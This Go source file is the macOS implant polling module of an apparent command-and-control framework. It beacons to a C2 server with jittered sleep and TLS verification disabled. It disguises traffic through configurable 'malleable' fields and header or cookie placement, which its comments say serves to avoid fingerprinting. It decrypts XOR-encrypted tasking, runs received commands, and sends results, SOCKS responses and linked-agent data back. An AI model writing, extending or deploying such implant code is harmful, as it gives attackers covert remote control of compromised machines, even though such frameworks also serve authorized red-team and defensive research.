// server/docker/payloads/Darwin/polling.go

//go:build darwin
// +build darwin

package main

import (
	"bytes"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"math"
	"math/rand"
	"net/http"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// PCfg stores communications-related template strings received from server
type PCfg struct {
	Version   int      `json:"v"`
	Type      int      `json:"t"`
	Templates []string `json:"tpl"`
	Params    []string `json:"p"`
}

// Comms template indices - must match server's common.go
const (
	// HTTP headers (710-716)
	idxCommsUserAgent   = 710
	idxCommsContentType = 711
	idxCommsPadPre      = 712
	idxCommsPadApp      = 713
	idxCommsMetaId      = 714
	idxCommsEncryption  = 715
	idxCommsEncRsaAes   = 716

	// Polling protocol (720-728)
	idxPollAppJson       = 720
	idxPollStatus        = 721
	idxPollRekey         = 722
	idxPollNoCommands    = 723
	idxPollAgentId       = 724
	idxPollResults       = 725
	idxPollType          = 726
	idxPollPayload       = 727
	idxPollHandshakeResp = 728
)

// Global comms template storage (uses SafeTemplate for memory zeroing)
var globalCommsTpl *SafeTemplate

// commsTpl safely retrieves a template string by index
func commsTpl(idx int) string {
	return globalCommsTpl.Get(idx)
}

// getPollStr gets polling string from template (no fallbacks - templates sent during handshake)
func getPollStr(idx int) string {
	return commsTpl(idx)
}

// Malleable field values - injected at build time via ldflags
// These can be customized in config.toml to avoid structural fingerprinting
var (
	MALLEABLE_REKEY_COMMAND             = "kr"
	MALLEABLE_REKEY_STATUS_FIELD        = "status"
	MALLEABLE_REKEY_DATA_FIELD          = "data"
	MALLEABLE_REKEY_ID_FIELD            = "command_db_id"
	MALLEABLE_LINK_DATA_FIELD           = "ld"
	MALLEABLE_LINK_COMMANDS_FIELD       = "lc"
	MALLEABLE_LINK_HANDSHAKE_FIELD      = "lh"
	MALLEABLE_LINK_HANDSHAKE_RESP_FIELD = "lr"
	MALLEABLE_LINK_UNLINK_FIELD         = "lu"
	MALLEABLE_ROUTING_ID_FIELD          = "r"
	MALLEABLE_PAYLOAD_FIELD             = "p"
	MALLEABLE_SOCKS_RESP_FIELD          = "sr"
)

// SyncConfig holds the configuration for polling behavior
type SyncConfig struct {
	GetURL          string
	PostURL         string
	DecryptedValues *ResolvedConfig
}

var (
	commandQueue    *WorkQueue
	resultManager   *OutputManager
	currentPolling  *sync.WaitGroup
	pollingShutdown chan struct{}
	pollingMutex    sync.Mutex
	rekeyInProgress atomic.Bool // Prevent concurrent rekey operations
)

// Package-level HTTP client for connection reuse
var sharedHTTPClient = &http.Client{
	Transport: &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
		MaxIdleConns:        10,
		IdleConnTimeout:     90 * time.Second,
		TLSHandshakeTimeout: 10 * time.Second,
	},
	Timeout: time.Second * 30,
}

func init() {
	commandQueue = NewCommandQueue()
	resultManager = NewResultManager()
	currentPolling = &sync.WaitGroup{}
	pollingShutdown = make(chan struct{})
}

// deriveXORKey creates the same XOR key as the server
func deriveXORKey(clientID, secret string) []byte {
	// Must match server implementation exactly
	combined := clientID + ":" + secret
	hash := sha256.Sum256([]byte(combined))
	return hash[:32]
}

// decBytes decrypts byte array using XOR
func decBytes(data []byte, key []byte) []byte {
	result := make([]byte, len(data))
	for i := 0; i < len(data); i++ {
		result[i] = data[i] ^ key[i%len(key)]
	}
	return result
}

// tryDecryptResponse attempts to find and decrypt the XOR encrypted field
func tryDecryptResponse(rawResponse map[string]interface{}, cfgKey []byte) (map[string]interface{}, error) {
	// Try each field in the response
	for _, fieldValue := range rawResponse {
		// Skip non-string fields
		strValue, ok := fieldValue.(string)
		if !ok {
			continue
		}

		// Try to base64 decode
		encrypted, err := base64.StdEncoding.DecodeString(strValue)
		if err != nil {
			continue // Not valid base64, skip
		}

		// Try to XOR decrypt
		decrypted := decBytes(encrypted, cfgKey)

		// Try to parse as JSON
		var response map[string]interface{}
		if err := json.Unmarshal(decrypted, &response); err != nil {
			continue // Not valid JSON after decryption, skip
		}

		// Check if it has expected fields (status is required)
		if _, hasStatus := response[getPollStr(idxPollStatus)]; hasStatus {
			return response, nil
		}
	}

	return nil, fmt.Errorf("%s", Err(E18))
}

// checkAsyncBOFResults checks for pending async BOF results (Windows only)
// This function is only compiled and called on Windows where bofJobManager exists

// calculateJitteredInterval applies jitter to the base sleep interval
func calculateJitteredInterval(baseSeconds int, jitterPercent float64, r *rand.Rand) time.Duration {
	baseInterval := time.Duration(baseSeconds) * time.Second
	jitterFactor := jitterPercent / 100.0
	maxVariation := float64(baseInterval) * jitterFactor
	variation := (r.Float64()*2 - 1) * maxVariation
	jitteredInterval := time.Duration(float64(baseInterval) + variation)
	return jitteredInterval
}

// sendResults sends encrypted results to the server
func sendResults(encryptedData string, customHeaders map[string]string) error {
	// Get current URLs dynamically
	_, postURL := handshakeManager.getCurrentURLs()
	decryptedValues := handshakeManager.decryptedValues

	// Get transform DataBlocks
	_, postClientIDDataBlock, postDataDataBlock, _ := handshakeManager.getTransformDataBlocks()

	// Get the custom POST method from decrypted values
	method := decryptedValues.PostMethod
	if method == "" {
		method = secVal(geMethodPost) // Fallback to default
	}

	var bodyData []byte
	var transformedData []byte
	var prependLen, appendLen int
	var dataOutputLocation string

	// Check if POST data transforms are configured
	if postDataDataBlock != nil && len(postDataDataBlock.Transforms) > 0 {
		// Apply transforms to the encrypted data
		transformed, err := applyTransforms([]byte(encryptedData), postDataDataBlock.Transforms)
		if err != nil {
			return fmt.Errorf("%s", ErrCtx(E18, err.Error()))
		}
		transformedData = transformed.Data
		prependLen = transformed.PrependLength
		appendLen = transformed.AppendLength
		dataOutputLocation = postDataDataBlock.Output

		// Check if output is body or elsewhere
		locType, _ := parseOutput(dataOutputLocation)
		if locType == "body" {
			bodyData = transformedData
		} else {
			// Data goes in header/cookie/query - send empty or minimal body
			bodyData = []byte("{}")
		}
	} else {
		// Legacy: wrap in JSON
		postData := struct {
			Data string `json:"data"`
		}{
			Data: encryptedData,
		}
		jsonData, err := json.Marshal(postData)
		if err != nil {
			return fmt.Errorf("%s", ErrCtx(E18, err.Error()))
		}
		bodyData = jsonData
		dataOutputLocation = "body"
	}

	// Create request with custom method
	req, err := http.NewRequest(method, postURL, bytes.NewBuffer(bodyData))
	if err != nil {
		return fmt.Errorf("%s", ErrCtx(E12, err.Error()))
	}

	// Set content type based on transform mode
	if postDataDataBlock != nil && len(postDataDataBlock.Transforms) > 0 {
		// For transformed data, use content type from decrypted values or default
		contentType := decryptedValues.ContentType
		if contentType != "" {
			req.Header.Set(secVal(httpHeaderContentType), contentType)
		}
	} else {
		req.Header.Set(secVal(httpHeaderContentType), getPollStr(idxPollAppJson))
	}

	req.Header.Set(secVal(httpHeaderUserAgent), decryptedValues.UserAgent)

	// Add padding length headers if random transforms were used
	if prependLen > 0 {
		req.Header.Set(secVal(httpHeaderPadPre), fmt.Sprintf("%d", prependLen))
	}
	if appendLen > 0 {
		req.Header.Set(secVal(httpHeaderPadApp), fmt.Sprintf("%d", appendLen))
	}

	// Apply clientID transforms if configured
	if postClientIDDataBlock != nil && len(postClientIDDataBlock.Transforms) > 0 {
		transformed, err := applyTransforms([]byte(getClientID()), postClientIDDataBlock.Transforms)
		if err != nil {
			return fmt.Errorf("%s", ErrCtx(E18, err.Error()))
		}
		placeInLocation(req, postClientIDDataBlock.Output, transformed.Data, transformed.PrependLength, transformed.AppendLength)
	}

	// Place POST data in configured location (if not body)
	if dataOutputLocation != "" && dataOutputLocation != "body" {
		locType, _ := parseOutput(dataOutputLocation)
		if locType != "body" {
			placeInLocation(req, dataOutputLocation, transformedData, prependLen, appendLen)
			// Set cache headers for non-body POST data (after placeInLocation to not be overwritten)
			if prependLen > 0 {
				req.Header.Set(secVal(httpHeaderPadPre), fmt.Sprintf("%d", prependLen))
			}
			if appendLen > 0 {
				req.Header.Set(secVal(httpHeaderPadApp), fmt.Sprintf("%d", appendLen))
			}
		}
	}

	for key, value := range customHeaders {
		req.Header.Set(key, value)
	}

	resp, err := sharedHTTPClient.Do(req)
	if err != nil {
		return fmt.Errorf("%s", ErrCtx(E12, err.Error()))
	}
	defer func() {
		io.Copy(io.Discard, resp.Body) // drain body
		resp.Body.Close()              // then close
	}()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("%s", ErrCtx(E12, fmt.Sprintf("%d", resp.StatusCode)))
	}

	return nil
}

// doPoll performs a single poll cycle
func doPoll(secureComms *SecChan, customHeaders map[string]string) error {
	getURL, _ := handshakeManager.getCurrentURLs()
	decryptedValues := handshakeManager.decryptedValues
	getClientIDDataBlock, _, _, responseDataDataBlock := handshakeManager.getTransformDataBlocks()

	method := decryptedValues.GetMethod
	if method == "" {
		method = secVal(geMethodGet) // Fallback to default
	}

	// Create the request with custom method
	req, err := http.NewRequest(method, getURL, nil)
	if err != nil {
		return fmt.Errorf("%s", ErrCtx(E12, err.Error()))
	}

	// Apply clientID transforms if configured
	if getClientIDDataBlock != nil {
		if len(getClientIDDataBlock.Transforms) > 0 {
			transformed, err := applyTransforms([]byte(getClientID()), getClientIDDataBlock.Transforms)
			if err != nil {
				return fmt.Errorf("%s", ErrCtx(E18, err.Error()))
			}
			placeInLocation(req, getClientIDDataBlock.Output, transformed.Data, transformed.PrependLength, transformed.AppendLength)
		} else {
			placeInLocation(req, getClientIDDataBlock.Output, []byte(getClientID()), 0, 0)
		}
	}

	// Set headers
	req.Header.Set(secVal(httpHeaderUserAgent), decryptedValues.UserAgent)
	for key, value := range customHeaders {
		req.Header.Set(key, value)
	}

	// Send request
	resp, err := sharedHTTPClient.Do(req)
	if err != nil {
		return fmt.Errorf("%s", ErrCtx(E12, err.Error()))
	}
	defer func() {
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
	}()

	// Read response body
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("%s", ErrCtx(E10, err.Error()))
	}

	// Use a generic response map instead of struct to support malleable field names
	var responseMap map[string]interface{}

	// Check if response transforms are configured
	if responseDataDataBlock != nil && len(responseDataDataBlock.Transforms) > 0 {
		// Get padding lengths from response headers
		prependLen, _ := strconv.Atoi(resp.Header.Get(secVal(httpHeaderPadPre)))
		appendLen, _ := strconv.Atoi(resp.Header.Get(secVal(httpHeaderPadApp)))

		// Check output location - extract from header/cookie if not body
		locType, locName := parseOutput(responseDataDataBlock.Output)

		var responseData []byte
		switch locType {
		case "header":
			// Extract from header - server base64 encodes when placing in header
			headerValue := resp.Header.Get(locName)
			if headerValue == "" {
				return fmt.Errorf("%s", ErrCtx(E18, "response header empty"))
			}
			// Base64 decode (server adds extra encoding for header safety)
			responseData, err = base64.StdEncoding.DecodeString(headerValue)
			if err != nil {
				return fmt.Errorf("%s", ErrCtx(E18, err.Error()))
			}
		case "cookie":
			// Extract from cookie - server base64 encodes when placing in cookie
			for _, cookie := range resp.Cookies() {
				if cookie.Name == locName {
					responseData, err = base64.StdEncoding.DecodeString(cookie.Value)
					if err != nil {
						return fmt.Errorf("%s", ErrCtx(E18, err.Error()))
					}
					break
				}
			}
			if responseData == nil {
				return fmt.Errorf("%s", ErrCtx(E18, "response cookie not found"))
			}
		default:
			// Body - use as-is
			responseData = body
		}

		// Reverse transforms on the extracted data
		body, err = reverseTransforms(responseData, responseDataDataBlock.Transforms, prependLen, appendLen)
		if err != nil {
			return fmt.Errorf("%s", ErrCtx(E18, err.Error()))
		}

		// After reversing transforms, body is raw XOR-encrypted bytes
		// XOR decrypt directly (not base64 encoded)
		currentSecret := secureComms.getDecryptionSecret()
		cfgKey := deriveXORKey(getClientID(), currentSecret)
		decrypted := decBytes(body, cfgKey)

		// Parse the decrypted JSON
		if err := json.Unmarshal(decrypted, &responseMap); err != nil {
			previewLen := len(decrypted)
			if previewLen > 100 {
				previewLen = 100
			}
			return fmt.Errorf("%s", ErrCtx(E18, err.Error()))
		}
	} else {
		// Legacy: no transforms - body is JSON with encrypted field inside
		// First try to parse as raw JSON
		var rawResponse map[string]interface{}
		if err := json.Unmarshal(body, &rawResponse); err != nil {
			return fmt.Errorf("%s", ErrCtx(E18, err.Error()))
		}

		// Check if this is an XOR encrypted response
		// Try to detect by checking if the malleable status field exists
		if _, hasStatus := rawResponse[MALLEABLE_REKEY_STATUS_FIELD]; !hasStatus && len(rawResponse) > 0 {
			// Likely encrypted, try to decrypt

			// Get current secret from secureComms
			currentSecret := secureComms.getDecryptionSecret()
			cfgKey := deriveXORKey(getClientID(), currentSecret)

			decryptedMap, err := tryDecryptResponse(rawResponse, cfgKey)
			if err != nil {
				// Couldn't decrypt, use raw response
				responseMap = rawResponse
			} else {
				// Successfully decrypted
				responseMap = decryptedMap
			}
		} else {
			// Unencrypted response
			responseMap = rawResponse
		}
	}

	// Extract values using malleable field names
	var responseStatus string
	var responseData string
	var responseCommandDBID interface{}

	if statusVal, ok := responseMap[MALLEABLE_REKEY_STATUS_FIELD]; ok {
		if s, ok := statusVal.(string); ok {
			responseStatus = s
		}
	}
	if dataVal, ok := responseMap[MALLEABLE_REKEY_DATA_FIELD]; ok {
		if d, ok := dataVal.(string); ok {
			responseData = d
		}
	}
	if cmdIDVal, ok := responseMap[MALLEABLE_REKEY_ID_FIELD]; ok {
		responseCommandDBID = cmdIDVal
	}

	// Check for rekey command
	if responseStatus == MALLEABLE_REKEY_COMMAND {

		// Extract command DB ID for the rekey result
		var commandDBID int
		switch v := responseCommandDBID.(type) {
		case float64:
			commandDBID = int(v)
		case int:
			commandDBID = v
		case string:
			commandDBID, _ = strconv.Atoi(v)
		}

		// execute rekey command directly without decryption

		// Create result for the rekey command first (before triggering rekey)
		rekeyResult := &OpResult{
			Cmd: Msg{
				Cmd:     getPollStr(idxPollRekey),
				DID: commandDBID,
				AID:     getClientID(),
			},
			Done: time.Now().Format(time.RFC3339),
			Output:      Succ(S15),
			EC:    0,
		}

		resultManager.addResult(rekeyResult)

		if rekeyInProgress.CompareAndSwap(false, true) {
			go func() {
				defer rekeyInProgress.Store(false)
				refreshHandshake()
			}()
		}

		return fmt.Errorf("%s", Err(E19))
	}

	// Check for no commands
	if responseStatus == getPollStr(idxPollNoCommands) {
		return nil
	}

	// Normal encrypted command processing
	if responseData != "" {
		decrypted, err := secureComms.decryptMessage(responseData)
		if err != nil {
			// Log decryption failure which might indicate key desync

			// Automatically trigger rekey in background
			// Use atomic flag to prevent multiple concurrent rekey operations
			if rekeyInProgress.CompareAndSwap(false, true) {
				go func() {
					defer rekeyInProgress.Store(false)
					refreshHandshake()
				}()
			}
			return nil
		}


		commandQueue.addCommands(decrypted)

		for {
			result, err := commandQueue.processNextCommand()
			if err != nil {
				continue
			}
			if result == nil {
				break
			}
			resultManager.addResult(result)
		}
		secureComms.rotateSecret()
	}

	return nil
}

// startPolling initializes and starts the polling routine
func startPolling(config SyncConfig, sysInfo *NR) error {

	// Use the SecChan from ConnMgr instead of creating a new one
	secureComms := handshakeManager.getSecureComms()
	if secureComms == nil {
		// Fallback to creating new one if not available (shouldn't happen)
		secureComms = NewSecureComms(
			handshakeManager.decryptedValues.Secret,
			sysInfo.DT.SD,
		)
	}

	// Create a fresh shutdown channel for this polling session
	pollingMutex.Lock()
	pollingShutdown = make(chan struct{}) // Fresh channel for this session
	pollingMutex.Unlock()

	r := rand.New(rand.NewSource(time.Now().UnixNano()))

	// Parse custom headers from handshakeManager
	customHeaders, err := parseCustomHeaders(handshakeManager.decryptedValues.CustomHeaders)
	if err != nil {
		return fmt.Errorf("%s", ErrCtx(E18, err.Error()))
	}

	// Add to WaitGroup before starting goroutine
	currentPolling.Add(1)


	go func() {
		// Ensure we call Done when goroutine exits
		defer currentPolling.Done()

		consecutiveErrors := 0
		maxBackoffMultiplier := 5

		// Add label for outer loop
	pollingLoop:
		for {
			// Check for shutdown signal at the start of each iteration
			select {
			case <-pollingShutdown:
				return
			default:
				// Continue with polling
			}

			// Get current sleep and jitter values at start of each iteration
			baseSeconds, err := strconv.Atoi(sleep)
			if err != nil {
				baseSeconds = 30 // Default to 30 seconds if invalid
			}

			// Get current jitter value
			jitterValue, err := strconv.ParseFloat(jitter, 64)
			if err != nil {
				jitterValue = 10.0 // Default to 10% if invalid
			}

			nextInterval := calculateJitteredInterval(baseSeconds, jitterValue, r)
			if consecutiveErrors > 0 {
				backoffMultiplier := math.Min(float64(consecutiveErrors), float64(maxBackoffMultiplier))
				backoffInterval := time.Duration(float64(nextInterval) * math.Pow(2, backoffMultiplier))
				nextInterval = backoffInterval
			}

			// Collect link data from connected TCP agents (if any)
			linkData := getLinkManager().getOutboundData()
			// Collect link handshake data (for new linked agents, sent via "lh" field)
			linkHandshake := getLinkManager().getHandshakeData()
			// Collect unlink notifications (routing IDs that have been disconnected)
			unlinkNotifications := getLinkManager().getUnlinkNotifications()

			// Check for SOCKS HTTP responses
			hasSocksResp := hasPendingSocksResponses()

			// Handle pending results before sleep
			hasResults := resultManager.hasResults()
			hasLinkData := len(linkData) > 0
			hasLinkHandshake := linkHandshake != nil
			hasUnlinkNotifications := len(unlinkNotifications) > 0

			if hasResults || hasLinkData || hasLinkHandshake || hasUnlinkNotifications || hasSocksResp {
				results := resultManager.getPendingResults()
				payload := make(map[string]interface{})
				payload[getPollStr(idxPollAgentId)] = getClientID()

				if len(results) > 0 {
					payload[getPollStr(idxPollResults)] = results
				}
				if hasLinkData {
					payload[MALLEABLE_LINK_DATA_FIELD] = ConvertLinkDataToMaps(linkData)
				}
				if hasLinkHandshake {
					// Send handshake as single object via "lh" field
					payload[MALLEABLE_LINK_HANDSHAKE_FIELD] = linkHandshake.toMalleableMap()
				}
				if hasUnlinkNotifications {
					payload[MALLEABLE_LINK_UNLINK_FIELD] = unlinkNotifications
				}
				if hasSocksResp {
					socksResp := GetSocksHTTPResponses()
					if len(socksResp) > 0 {
						payload[MALLEABLE_SOCKS_RESP_FIELD] = socksResp
					}
				}

				jsonData, err := json.Marshal(payload)
				if err == nil {
					encrypted, err := secureComms.encryptMessage(string(jsonData))
					if err == nil {
						if err := sendResults(encrypted, customHeaders); err == nil {
							for _, result := range results {
								if result.CurrentChunk > 0 && result.CurrentChunk == result.TotalChunks {
									commandQueue.mu.Lock()
									if _, exists := commandQueue.activeDownloads[result.Filename]; exists {
										delete(commandQueue.activeDownloads, result.Filename)
									}
									commandQueue.mu.Unlock()
								}
							}
							secureComms.rotateSecret()
						}
					}
				}
			}

			// Check for shutdown before sleep
			select {
			case <-pollingShutdown:
				return
			case <-time.After(nextInterval):
				// Continue with next poll
			}

			// Perform the poll AFTER sleep
			if err := doPoll(secureComms, customHeaders); err != nil {
				// Check if this is a rekey in progress - if so, exit the entire goroutine
				if err.Error() == E19 {
					break pollingLoop // Break out of the outer for loop
				}
				// Check for decryption failures
				if strings.Contains(err.Error(), E18) {
					// Could trigger automatic rekey here if needed
				}
				consecutiveErrors++
			} else {
				consecutiveErrors = 0
			}
		}
	}()

	return nil
}

// stopPolling signals the current polling routine to stop and waits for it to finish
func stopPolling() {

	pollingMutex.Lock()
	if pollingShutdown != nil {
		close(pollingShutdown)
		pollingShutdown = nil // Set to nil instead of creating new channel
	}
	pollingMutex.Unlock()

	// Wait with timeout to prevent hanging
	done := make(chan struct{})
	go func() {
		currentPolling.Wait()
		close(done)
	}()

	select {
	case <-done:
	case <-time.After(10 * time.Second):
	}

	// Reset only the WaitGroup, NOT the channel
	pollingMutex.Lock()
	currentPolling = &sync.WaitGroup{}
	// Don't recreate pollingShutdown here - leave it nil
	pollingMutex.Unlock()
}
